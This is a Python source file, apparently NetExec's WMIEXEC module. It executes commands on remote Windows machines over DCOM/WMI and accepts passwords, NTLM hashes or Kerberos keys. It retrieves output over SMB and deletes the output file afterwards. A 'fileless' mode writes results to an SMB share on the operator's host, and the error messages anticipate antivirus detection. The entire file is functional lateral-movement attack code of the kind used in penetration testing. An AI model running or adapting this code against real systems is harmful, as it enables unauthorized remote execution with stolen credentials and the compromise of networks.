import ntpath
import os
from time import sleep
from nxc.connection import dcom_FirewallChecker
from nxc.helpers.misc import gen_random_string
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL


class WMIEXEC:
    def __init__(self, target, share_name, username, password, domain, smbconnection, doKerberos=False, aesKey=None, kdcHost=None, remoteHost=None, hashes=None, share=None, logger=None, timeout=None, tries=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share = share
        self.__timeout = timeout
        self.__smbconnection = smbconnection
        self.__output = None
        self.__outputBuffer = b""
        self.__share_name = share_name
        self.__shell = "cmd.exe /Q /c "
        self.__pwd = "C:\\"
        self.__aesKey = aesKey
        self.__kdcHost = kdcHost
        self.__remoteHost = remoteHost
        self.__doKerberos = doKerberos
        self.__retOutput = True
        self.__stringBinding = ""
        self.__tries = tries
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""
        self.__dcom = DCOMConnection(
            self.__target,
            self.__username,
            self.__password,
            self.__domain,
            self.__lmhash,
            self.__nthash,
            self.__aesKey,
            oxidResolver=True,
            doKerberos=self.__doKerberos,
            kdcHost=self.__kdcHost,
            remoteHost=self.__remoteHost,
        )
        iInterface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        flag, self.__stringBinding = dcom_FirewallChecker(iInterface, self.__remoteHost, self.__timeout)
        if not flag or not self.__stringBinding:
            error_msg = f'WMIEXEC: Dcom initialization failed on connection with stringbinding: "{self.__stringBinding}", please increase the timeout with the option "--dcom-timeout". If it\'s still failing maybe something is blocking the RPC connection, try another exec method'

            if not self.__stringBinding:
                error_msg = "WMIEXEC: Dcom initialization failed: can't get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again"

            self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)
            # Make it force break function
            self.__dcom.disconnect()
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLevel1Login.RemRelease()
        self.__win32Process, _ = iWbemServices.GetObject("Win32_Process")

    def execute(self, command, output=False):
        self.__retOutput = output
        if self.__retOutput:
            self.__smbconnection.setTimeout(100000)
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_handler(c.strip())
        else:
            self.execute_handler(command)
        self.__dcom.disconnect()
        return self.__outputBuffer

    def cd(self, s):
        self.execute_remote("cd " + s)
        if len(self.__outputBuffer.strip("\r\n")) > 0:
            self.__outputBuffer = b""
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote("cd ")
            self.__pwd = self.__outputBuffer.strip("\r\n")
            self.__outputBuffer = b""

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_handler(self, data):
        try:
            self.logger.debug("Executing remote")
            self.execute_remote(data)
        except Exception:
            self.cd("\\")
            self.execute_remote(data)

    def execute_remote(self, data):
        self.__output = "\\Windows\\Temp\\" + gen_random_string(6)

        command = self.__shell + data
        if self.__retOutput:
            command += " 1> " + f"{self.__output}" + " 2>&1"

        self.logger.debug("Executing command: " + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_remote()

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]

        command = self.__shell + data + f" 1> \\\\{local_ip}\\{self.__share_name}\\{self.__output} 2>&1"

        self.logger.debug("Executing command: " + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_fileless()

    def get_output_fileless(self):
        while True:
            try:
                with open(os.path.join("/tmp", "nxc_hosted", self.__output)) as output:
                    self.output_callback(output.read())
                break
            except OSError:
                sleep(2)

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return

        tries = 0
        # Give the command a bit of time to execute before we try to read the output, 0.4 seconds was good in testing
        sleep(0.4)
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if tries > self.__tries:
                    self.logger.fail("wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method")
                    break
                elif "STATUS_BAD_NETWORK_NAME" in str(e):
                    self.logger.fail(f"SMB connection: target has blocked {self.__share} access (maybe command executed!)")
                    break
                elif "STATUS_VIRUS_INFECTED" in str(e):
                    self.logger.fail("Command did not run because a virus was detected")
                    break
                # When executing powershell and the command is still running, we get a sharing violation
                # We can use that information to wait longer than if the file is not found (probably av or something)
                elif "STATUS_SHARING_VIOLATION" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} is still in use with {self.__tries - tries} left, retrying...")
                    sleep(1)
                    tries += 1
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} not found with {self.__tries - tries} left, deducting 10 tries and retrying...")
                    tries += 10
                    sleep(1)
                else:
                    self.logger.debug(f"Exception when trying to read output file: {e}")

        if self.__outputBuffer:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
            self.__smbconnection.deleteFile(self.__share, self.__output)
